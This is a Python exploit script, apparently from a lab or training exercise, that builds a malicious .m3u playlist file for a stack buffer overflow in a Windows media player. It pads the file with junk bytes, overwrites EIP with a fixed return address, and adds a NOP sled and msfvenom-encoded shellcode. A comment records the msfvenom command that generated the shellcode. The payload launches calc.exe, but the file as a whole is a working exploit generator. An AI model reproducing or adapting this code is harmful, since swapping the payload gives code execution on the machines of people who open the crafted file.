import struct
INPUT_FILE = "input.txt"
OUT = "payload/eip_check.m3u"

def crete_initial_garbage():
    f_input = open(INPUT_FILE, "r")
    junk = f_input.read()
    input_len = len(junk)
    OUTPUT_FILE = f"payload/out_{input_len}.m3u"
    f_output = open(OUTPUT_FILE, "wb")
    junk = bytearray(junk, "utf-8")
    f_output.write(junk)
    return input_len

junk = "A" * 26068
eip = struct.pack("<I", 0xdeadbeef)
eip = struct.pack("<I", 0x1001B058)
pre_shellcode = b"BBBB"
nop_sled = b"\x90" * 10
shellcode = b"\xcc" * 20
"""
└─# msfvenom -p windows/exec cmd=calc.exe -f python -b "\x00"   
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 220 (iteration=0)
x86/shikata_ga_nai chosen with final size 220
Payload size: 220 bytes
"""
shellcode =  b""
shellcode += b"\xda\xd9\xb8\xf2\x9e\x0f\x3c\xd9\x74\x24\xf4\x5a\x31"
shellcode += b"\xc9\xb1\x31\x31\x42\x18\x83\xc2\x04\x03\x42\xe6\x7c"
shellcode += b"\xfa\xc0\xee\x03\x05\x39\xee\x63\x8f\xdc\xdf\xa3\xeb"
shellcode += b"\x95\x4f\x14\x7f\xfb\x63\xdf\x2d\xe8\xf0\xad\xf9\x1f"
shellcode += b"\xb1\x18\xdc\x2e\x42\x30\x1c\x30\xc0\x4b\x71\x92\xf9"
shellcode += b"\x83\x84\xd3\x3e\xf9\x65\x81\x97\x75\xdb\x36\x9c\xc0"
shellcode += b"\xe0\xbd\xee\xc5\x60\x21\xa6\xe4\x41\xf4\xbd\xbe\x41"
shellcode += b"\xf6\x12\xcb\xcb\xe0\x77\xf6\x82\x9b\x43\x8c\x14\x4a"
shellcode += b"\x9a\x6d\xba\xb3\x13\x9c\xc2\xf4\x93\x7f\xb1\x0c\xe0"
shellcode += b"\x02\xc2\xca\x9b\xd8\x47\xc9\x3b\xaa\xf0\x35\xba\x7f"
shellcode += b"\x66\xbd\xb0\x34\xec\x99\xd4\xcb\x21\x92\xe0\x40\xc4"
shellcode += b"\x75\x61\x12\xe3\x51\x2a\xc0\x8a\xc0\x96\xa7\xb3\x13"
shellcode += b"\x79\x17\x16\x5f\x97\x4c\x2b\x02\xfd\x93\xb9\x38\xb3"
shellcode += b"\x94\xc1\x42\xe3\xfc\xf0\xc9\x6c\x7a\x0d\x18\xc9\x74"
shellcode += b"\x47\x01\x7b\x1d\x0e\xd3\x3e\x40\xb1\x09\x7c\x7d\x32"
shellcode += b"\xb8\xfc\x7a\x2a\xc9\xf9\xc7\xec\x21\x73\x57\x99\x45"
shellcode += b"\x20\x58\x88\x25\xa7\xca\x50\x84\x42\x6b\xf2\xd8"

payload = bytes(junk, encoding="utf-8") + eip + pre_shellcode + nop_sled + shellcode
f_out = open(OUT, "wb")
f_out.write(payload)
f_out.close()
